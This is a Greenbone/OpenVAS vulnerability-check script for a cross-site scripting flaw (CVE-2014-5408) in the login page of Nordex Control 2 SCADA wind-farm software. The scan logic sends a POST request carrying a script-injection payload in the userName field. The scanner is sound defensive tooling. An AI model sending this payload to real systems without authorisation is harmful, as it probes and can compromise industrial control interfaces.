if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804789" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2014-5408" );
	script_bugtraq_id( 70851 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2014-11-11 17:47:43 +0530 (Tue, 11 Nov 2014)" );
	script_name( "Nordex NC2 'username' Parameter Cross Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with Nordex NC2
  and is prone to cross-site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Flaw exists because the application does not
  validate the 'username' parameter upon submission to the login script." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to execute arbitrary HTML and script code in a users browser session
  in the context of an affected site." );
	script_tag( name: "affected", value: "Nordex Control 2 (NC2) SCADA V15
  and prior versions" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/98443" );
	script_xref( name: "URL", value: "http://www.auscert.org.au/render.html?it=21058" );
	script_xref( name: "URL", value: "https://ics-cert.us-cert.gov/advisories/ICSA-14-303-01" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
http_port = http_get_port( default: 80 );
for dir in nasl_make_list_unique( "/", "/nordex", "/nc2", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	sndReq = http_get( item: NASLString( dir, "/index_en.jsp" ), port: http_port );
	rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
	if(ContainsString( rcvRes, ">Nordex Control" ) && ContainsString( rcvRes, ">Wind Farm" )){
		url = eregmatch( pattern: "<form .*method=.POST. action=.([a-z0-9/]+).>", string: rcvRes );
		postData = "connection=basic&userName=\"><script>alert(document" + ".cookie)</script>&pw=&language=en";
		host = http_host_name( port: http_port );
		sndReq = NASLString( "POST ", url[1], " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n", "\\r\\n", postData, "\\r\\n" );
		rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq, bodyonly: FALSE );
		if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "><script>alert(document.cookie)</script>" )){
			security_message( port: http_port );
			exit( 0 );
		}
	}
}
exit( 99 );

